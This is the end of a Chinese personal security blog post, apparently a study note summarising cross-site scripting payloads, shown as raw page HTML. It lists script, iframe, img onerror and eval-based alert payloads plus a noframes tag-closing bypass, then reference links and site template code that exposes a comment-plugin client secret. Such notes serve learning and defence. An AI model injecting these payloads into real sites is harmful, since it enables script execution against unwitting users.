+&lt;iframe/onload=alert(document.domain)><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`XSS`</span></span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>x</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript:window.onerror<span class="token punctuation">=</span>alert;throw 1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">z<span class="token operator">=</span><span class="token string">'javascript:'</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">z<span class="token operator">=</span>z<span class="token operator">+</span><span class="token string">'alert(/xxss/)'</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IFRAME</span> <span class="token attr-name">SRC</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript:alert(29);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>IFRAME</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+    <span class="token keyword">var</span> x <span class="token operator">=</span> "<span class="token number">123</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//";</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+
+
+闭合优先级高于双引号的标签
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noframes</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noscript</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+<span class="token operator">&lt;</span>style<span class="token operator">></span>
+<span class="token operator">&lt;</span>title<span class="token operator">></span>
+<span class="token operator">&lt;</span>xmp<span class="token operator">></span>
+利用方式
+<span class="token operator">&lt;</span>noframes<span class="token operator">></span>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span>"<span class="token comment" spellcheck="true">//a.com&lt;/noframes>&lt;script>alert(1)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>noframes</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>参考：</p>
+<p><a href="https://xz.aliyun.com/t/4067" target="_blank" rel="noopener">xss总结</a><br><a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">xss-payload</a></p>
+	
+	</div>
+	
+	<div id="current-post-cover" data-scr="/images/post-cover/26.jpg"></div>
+
+	<!-- relate post, comment...-->
+	<div class="investment-container">
+		<div class="investment-header">
+			<div class="investment-title-1">
+				<div class="on">相关文章</div>
+				<div>评论</div>
+			</div>
+			<div class="investment-title-2">	            
+				
+	<span>
+		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
+		
+			<a href="/2019/08/01/docker基础学习/" title="docker基础学习" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2019/07/30/浏览器解释机制和svg-xss/" title="浏览器解释机制和svg xss" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+      		
+			</div>	
+		</div>
+		
+		<div class="investment-content">
+			<div class="investment-content-list">
+				
+
+<div class="relate-post">
+	<ul>
+		
+				<li>
+					<div>
+						<a href="/2019/07/30/浏览器解释机制和svg-xss/" title="浏览器解释机制和svg xss">
+							浏览器解释机制和svg xss
+						</a>
+						<p>
+							前言最近，再看看xss，发现对xss并不是太了解，学习xss需要了解到浏览器的解释机制。我是看Tuuu Nya师傅文章里推荐的文章（深入理解浏览器解释机制和xss向量编码）。我自己总结一下吧。
+浏览器解析机制浏览器解析一篇HTML文档...
+						</p>
+					</div>
+
+					<a href="/2019/07/30/浏览器解释机制和svg-xss/" title="浏览器解释机制和svg xss">				
+						<img src="/images/post-cover/25.jpg" class="relateImg" alt="浏览器解释机制和svg xss">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/03/17/xss的绕过和利用/" title="xss的绕过和利用">
+							xss的绕过和利用
+						</a>
+						<p>
+							同源策略同源策略（Same origin policy）是一种约定，它是最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。
+浏览...
+						</p>
+					</div>
+
+					<a href="/2019/03/17/xss的绕过和利用/" title="xss的绕过和利用">				
+						<img src="/images/post-cover/19.jpg" class="relateImg" alt="xss的绕过和利用">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/08/06/2018n1ctf-esay-php复现/" title="2018n1ctf-esay-php复现">
+							2018n1ctf-esay-php复现
+						</a>
+						<p>
+							前言最近做题，两次遇见这个题。第一次看着writeup都没复现成功。emm（菜的真实。。。）。这次自己搭的环境用三种方法来复现这个题。
+环境搭建官方给了环境，有dockerfile。所以比较容易搭建的。官方文件在docker上安装上d...
+						</p>
+					</div>
+
+					<a href="/2019/08/06/2018n1ctf-esay-php复现/" title="2018n1ctf-esay-php复现">				
+						<img src="/images/post-cover/27.jpg" class="relateImg" alt="2018n1ctf-esay-php复现">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/08/02/phpinfo中的敏感信息/" title="phpinfo中的敏感信息">
+							phpinfo中的敏感信息
+						</a>
+						<p>
+							## 
+
+						</p>
+					</div>
+
+					<a href="/2019/08/02/phpinfo中的敏感信息/" title="phpinfo中的敏感信息">				
+						<img src="/images/post-cover/27.jpg" class="relateImg" alt="phpinfo中的敏感信息">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/08/01/docker基础学习/" title="docker基础学习">
+							docker基础学习
+						</a>
+						<p>
+							docker介绍Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。可以模糊的理解为轻量级的虚拟机（其实不是虚拟机）。重要的是开源。。。
+dock...
+						</p>
+					</div>
+
+					<a href="/2019/08/01/docker基础学习/" title="docker基础学习">				
+						<img src="/images/post-cover/27.jpg" class="relateImg" alt="docker基础学习">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/07/24/flask框架/" title="flask框架">
+							flask框架
+						</a>
+						<p>
+							python flask框架hello worldfrom flask import Flask
+
+app = Flask(__name__)
+@app.route('/') 
+
+def index(name):
+    return...
+						</p>
+					</div>
+
+					<a href="/2019/07/24/flask框架/" title="flask框架">				
+						<img src="/images/post-cover/26.jpg" class="relateImg" alt="flask框架">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/16/刷题记录/" title="刷题记录">
+							刷题记录
+						</a>
+						<p>
+							一步步慢慢绕题目：
+&lt;?php
+show_source(__FILE__);
+$v1=0;$v2=0;$v3=0;
+$a=(array)json_decode(@$_GET['foo']);
+if(is_array($a)){
+...
+						</p>
+					</div>
+
+					<a href="/2019/06/16/刷题记录/" title="刷题记录">				
+						<img src="/images/post-cover/38.jpg" class="relateImg" alt="刷题记录">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/14/哈希长度拓展攻击-hashpump/" title="哈希长度拓展攻击-hashpump">
+							哈希长度拓展攻击-hashpump
+						</a>
+						<p>
+							哈希长度拓展攻击条件需要知道
+
+密文长度 (SECRET)
+明文 （哈希值）
+部分密文内容 （auth）
+
+HashPump安装HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、...
+						</p>
+					</div>
+
+					<a href="/2019/06/14/哈希长度拓展攻击-hashpump/" title="哈希长度拓展攻击-hashpump">				
+						<img src="/images/post-cover/6.jpg" class="relateImg" alt="哈希长度拓展攻击-hashpump">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/13/sql注入新姿势-2019强网杯/" title="‘sql注入新姿势-2019强网杯">
+							‘sql注入新姿势-2019强网杯
+						</a>
+						<p>
+							
+						</p>
+					</div>
+
+					<a href="/2019/06/13/sql注入新姿势-2019强网杯/" title="‘sql注入新姿势-2019强网杯">				
+						<img src="/img/cart_cover.jpg" class="relateImg" alt="‘sql注入新姿势-2019强网杯">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/11/php代码审计之文件包含/" title="php代码审计之文件包含">
+							php代码审计之文件包含
+						</a>
+						<p>
+							文件包含文件包含分为本地文件包含（Local File Inclusion，简LFI)和远程文件包含（Remote File Inclusion，简RFI）。
+在php中常见的文件包含函数有：
+include()
+include_on...
+						</p>
+					</div>
+
+					<a href="/2019/06/11/php代码审计之文件包含/" title="php代码审计之文件包含">				
+						<img src="/images/post-cover/37.jpg" class="relateImg" alt="php代码审计之文件包含">
+					</a>
+				</li>											
+		
+		
+	</ul>
+</div>	
+			</div>
+			<div class="investment-content-list">
+				<div class="layout-comment">
+
+	
+
+		
+
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//Thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//Remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//Create gitalk
+	var gitalk = new Gitalk({
+		clientID: 'b7a5e9f0853539dc3363',
+		clientSecret: '3cd61bd5dfe5ddffe1c91e4392ca95874aade540',
+		//id: window.location.pathname,
+		//id: decodeURI(window.location.pathname),
+		//id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+		repo: 'blog-Comment-Repo',
+		owner: 'ab-Alex',
+		admin: 'ab-Alex',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+
+		
+		
+	
+
+</div>
+			</div>
+		</div>	
+	</div>
+</div>
+
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+
+	<script>
+		var appid = 'dXz',
+            appkey = 'wzG';	  
+        AnnieLeancloud(appid, appkey);         
+	</script>
+    
+
+
+ 
+
+<!-- show math formula -->
+
+	<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+	<script type="text/x-mathjax-config">
+		MathJax.Hub.Config(
+			{ 
+				tex2jax: {
+					inlineMath: [['$','$'], ['\\(','\\)']]
+				} 
+			}
+		);
+	</script>
+
+
+
+<script>
+	//Refer to https://xinyo.org/archives/66226, thanks xinyo!
+	function codeCopy() {
+		var copyContainerId = 'copy-nav';
+						
+		$("pre").before(" <nav class=' " + copyContainerId + " '><i class='code-language'></i></nav> ");
+		
+		$('.' + copyContainerId).append("<i class='fa fa-clipboard copy-btn' aria-hidden='true'></i>");
+		
+		$('#article-content').find('pre').each( function () {
+			var language = $(this).children('code').attr('class').substr(9);//why 9? Need to check language?
+			$(this).prev().find('.code-language').text( language );	
+		});
+				
+		//为复制按钮添加click事件
+		$('.copy-btn').on("click", function() {
+			//初始化
+			$("textarea").remove("#targetId");
+			
+			//获取对应的代码
+			var codePre = $(this).parent().next(),
+				codeText = codePre[0].textContent,
+				target = document.createElement("textarea");
+			target.style.position = "absolute";
+			target.style.left = "-9999px";
+			target.style.top = "0";
+			target.id = "targetId";
+			codePre.append(target);
+			target.textContent = codeText;
+
+			//选中textarea内的代码
+			target.focus();
+			target.setSelectionRange(0, target.value.length);
+
+			// 复制选中的内容
+			document.execCommand("copy");
+			
+			//删除添加的节点
+			$("textarea").remove("#targetId");
+			
+			var thisCopied = $(this);
+			thisCopied.addClass('copy-status');	
+			setTimeout( function() {
+				thisCopied.removeClass('copy-status');
+			}, 2000)
+		});	
+	}
+	
+	if( $('.layout-post').length )	{
+		codeCopy();
+	}
+</script>
+
+
+<!-- TODO: There seems to be a bug when you close the post gallery! -->
+<link rel="stylesheet" href="/plugin/lightgallery/css/lightgallery.css">
+<script src="/plugin/lightgallery/js/jquery-1.11.0.min.js"></script>
+<script src="/plugin/lightgallery/js/lightgallery-all.min.js"></script>
+
+<script type="text/javascript">
+	var postTitle = $('.article-title a').text() ? $('.article-title a').text() : "No post title!";
+	$('.article-content img').each(function() {
+		var imgPath = $(this).attr('src'),
+			imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		$(this).wrap('<div class="img-responsive" data-src="' + imgPath + '" data-responsive="' + imgPath + '" data-sub-html="<p>图片 ' + imgTitle + '</p><h4>文章' + postTitle + '</h4>"></div>');
+	});
+
+	$('.article-content').lightGallery({
+		mode: 'lg-slide',
+		selector: '.img-responsive',
+		share: false,
+		zoom: false,
+		download: false
+	});
+	//TODO：支持video
+</script>
+
+<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+		
+
+		<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+		<script src="/plugin/toc/katelog.min.js"></script>
+
+		
+	
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="social">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+		
+	<div class="copyright">
+		<p>
+			 
+				&copy;2017 - 2019, content by Alex. All Rights Reserved.
+			
+			
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+		</p>
+		<p>
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay. 					
+		</p>
+	</div>		
+</footer>
+		
+    <!-- set '1' to show motto in all pages! -->
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html( getMingYanContent() );
+	</script>	
+
+
+
+
+    <!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup">
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      ESC
+   </span>
+		<div class="local-search-header">
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			
+
+   
+	<div id="topN"></div>
+	
+    <script>
+        var appid = 'dXz',
+            appkey = 'wzG',
+            limitCount = 10;
+        if( $('#topN').length ){
+            AV.initialize(appid, appkey);
+            var Counter = AV.Object.extend("Counter");  
+            topNPost(Counter, limitCount);
+        }
+    </script>
+   
+
+		</div>
+	</div>
+</div>
+
+<script src="/js/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+    <script src="/js/love.js"></script>
+
+
+<!--back to top-->
+
+    
+	<div id="totop">
+  		<a href="javascript:;"  name="TOTOP" class="fa fa-arrow-up" ></a>
+	</div>
+	<div id="tobuttom">
+		<a href="javascript:;"  name="TOBUTTOM" class="fa fa-arrow-down" ></a>
+	</div>
+ 
+
+
+ 
+
+<script src="/js/vibrant.js"></script>
+<script src="/js/chinese.js"></script>
+<script src="/js/main.js"></script>
+	</body>
+	</html>
